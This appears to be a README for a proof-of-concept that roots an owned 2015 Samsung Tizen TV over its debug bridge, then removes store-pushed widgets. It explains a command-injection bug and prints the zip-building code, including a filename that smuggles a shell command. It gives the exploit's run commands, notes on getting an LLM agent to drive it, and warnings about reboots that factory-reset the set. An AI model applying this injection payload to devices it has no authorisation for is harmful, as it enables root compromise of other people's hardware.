# Root your own 2015 Samsung TV

A proof-of-concept for getting `uid=0` on a retail Samsung Smart TV (2015 HAWKM-series, Tizen 2.3) over Samsung's own debug bridge, then removing the bloatware properly — and a prompt so an LLM can drive the whole thing with you.

**It is not a jailbreak in the iPhone sense.** Nothing flashes. Nothing is permanent. Every root command re-runs the same two-second install and drops back to a root shell. If it fails, reboot the TV from the remote and you are exactly where you started.

Published because the technique is public and the fiddly part is not the exploit, it's the twenty minutes of setup and the twelve ways the tools lie to you.

- Write-up: https://bezlant.com/tv-root
- The player we ended up building: https://github.com/bezlant/jellyfin-tizen-mini

## Hand it to your agent

Clone it, open your coding agent in the directory, and say:

```
read AGENTS.md and root my TV. it is a <model> on firmware <version>.
```

`AGENTS.md` makes the agent gate on real preconditions, run the proof, read the evidence log instead of guessing, and stop for the things that bite. `LLM-PROMPT.md` is the same procedure for a plain chat window if you would rather drive it yourself.

## What's in here

| File | What it does |
|---|---|
| `Samsung-SDB-PoC.sh` | The exploit. Default `--proof-only` mode proves `uid=0` and writes an evidence log, then exits. `--shell` gives you an interactive root shell. |
| `tv-root-cmd.sh` | Batched, non-interactive root runner. `TARGET=<ip>:26101 ./tv-root-cmd.sh "id" "ls /opt/usr/apps"` |
| `AGENTS.md` | Rules for a coding agent: preconditions, failure taxonomy, hard stops. |
| `LLM-PROMPT.md` | The prompt to paste into an LLM together with your TV's model and firmware. |

## How the bug works

`vd_appinstall` is an SDB handler that takes a file path and builds a shell command around it without quoting. The path never gets escaped.

`un_zip` is another handler that extracts a supplied zip into a directory and, if the zip contains a symlink, restores it as a symlink.

So:

1. make a zip containing a regular file whose *name* is `x;sh /opt/usr/apps/tmp/w.sh;#`
2. include a symlink pointing at that name
3. extract the zip through `un_zip`
4. hand the symlink to `vd_appinstall`

`vd_appinstall` resolves the symlink to the metacharacter filename, the shell splits on `;`, and `sh w.sh` runs as root because `vd_appinstall` runs as root under `wascmd`.

The carrier looks like this (`create_system=3` marks the UNIX attributes):

```python
regular = zipfile.ZipInfo("x;sh /opt/usr/apps/tmp/w.sh;#")
regular.create_system = 3
regular.external_attr = (stat.S_IFREG | 0o644) << 16

link = zipfile.ZipInfo("link")
link.create_system = 3
link.external_attr = (stat.S_IFLNK | 0o777) << 16
link_content = "x;sh /opt/usr/apps/tmp/w.sh;#"
```

## Requirements

- A Samsung TV you own, from roughly the 2015 HAWKM era, on Tizen 2.3.
- **Developer mode on, with your computer's IP whitelisted.** This is the step people get stuck on: `Apps` → press `12345` on the remote → Developer mode → enter your machine's LAN IP → reboot the TV from the remote.
- Tizen `sdb` on your PATH, or pass `--sdb /path/to/sdb`.
- Python 3.6+ and Bash. macOS or Linux.
- The TV and your machine on the same LAN.

Check the bridge before anything else:

```bash
sdb connect 192.168.1.50:26101
sdb devices
```

You want `device` in the output, not `offline` and not `unauthorized`. If the TV's whitelist has the wrong IP, or your router handed you a different lease, this will silently fail. Fix that first.

## Run it

Proof only (recommended first):

```bash
./Samsung-SDB-PoC.sh --target 192.168.1.50
```

You should see:

```
IDENTITY=uid=0(root) gid=0(root) groups=0(root),...
SECURITY_CONTEXT=sdbd
POC_RESULT=VULNERABLE_UID0_COMMAND_EXECUTION_CONFIRMED
```

Interactive root:

```bash
./Samsung-SDB-PoC.sh --target 192.168.1.50 --shell
```

Batched, from a script:

```bash
TARGET=192.168.1.50:26101 SDB=/path/to/sdb \
  ./tv-root-cmd.sh "id" "wascmd -l" "ls -la /opt/usr/apps"
```

## Remove the bloat

The bloat on this set was four store-pushed widgets plus a sync daemon that reinstalls them after every standby/wake. The widget list on this exact TV:

| Widget | Samsung/WAS id |
|---|---|
| iflix | `3201610010763` |
| adplayer | `3201503001519` |
| PrimeTime | `3201505002606` |
| Samsung Showtime | `111399001101` |

```bash
./tv-root-cmd.sh \
  "wascmd -u 3201610010763" \
  "wascmd -u 3201503001519" \
  "wascmd -u 3201505002606" \
  "wascmd -u 111399001101" \
  "ls -la /opt/usr/apps"
```

`wascmd -u` takes the numeric Samsung **WAS** id, not the Tizen app id that `applist` prints. Passing the Tizen id gets you a friendly-looking `uninstall failed[APPID_NOT_EXIST]` and exit code 0, which is a lie. `wascmd -l` maps one namespace to the other. On another model, use `wascmd -l` to find your own ids instead of copying the table above.

To stop the store putting them back, back up and then empty the preinstall endpoint list:

```bash
./tv-root-cmd.sh \
  "cp /opt/var/kdb/db/comss/gpmurl/apps /opt/var/kdb/db/comss/gpmurl/apps.bak" \
  ": > /opt/var/kdb/db/comss/gpmurl/apps"
```

Restore is the `cp` in reverse. The daemon (`comss`) caches the list at startup, so restart it — or standby/wake — before trusting the change.

## Installing your own widget

`wascmd -i <app_id> -p <absolute_path>` installs a signed `.wgt` as root. Two things worth knowing before you try:

- Every install attempt **consumes** the staged package, including failed ones. Verify with `ls` immediately before, not with a stat.
- A brand-new widget id is not registered with the package manager, so `wascmd -i` answers `APP_NOT_EXIST` even with a perfectly valid package. Installing from `/opt/usr/apps/tmp/` and going through the SDK's own `vd_appinstall` got past registration on our set when `wascmd` alone did not.

## The LLM prompt

`LLM-PROMPT.md` is a single paste block. Fill in your model and firmware, attach this README and the two scripts, and let the model walk you through it. It is written to make the model check preconditions, quote real commands, and tell you when your set is probably not vulnerable instead of guessing.

## Hard stops

Learn from our scar tissue:

- **Do not run `reboot` as root on this firmware.** The vendor boot chain has a `dd` in it that writes a factory image over `/opt`, and ours came back fully factory reset. Use the remote.
- Do not flash anything if you can avoid it. The USB updater enforces a Samsung RSA signature, so a self-built firmware package is not going to install just because it says a newer version.
- Long commands get their SDB session silently abandoned around two to five seconds while the process keeps running. Background them and read the log after.
- Every operation here is reversible except a partition write. Back up the file you are about to change.

## Compatibility

Tested only on a UA40J6200, T-HKMFUABC-1550.0, Tizen 2.3. The same era of HAWKM firmware is the plausible range. Newer Tizen sets have a different SDB surface and this may do nothing at all — the `--proof-only` run tells you in ten seconds.

## Credit

The vulnerability is FcoMGX's, posted on the SamyGO forum (thread `t=14664`). This repo is a portable, logging wrapper around it plus the operational notes that took us three weeks to earn. The write-up covers the firmware container format, the update gate and the signature crypto if you want the deeper version.

MIT.
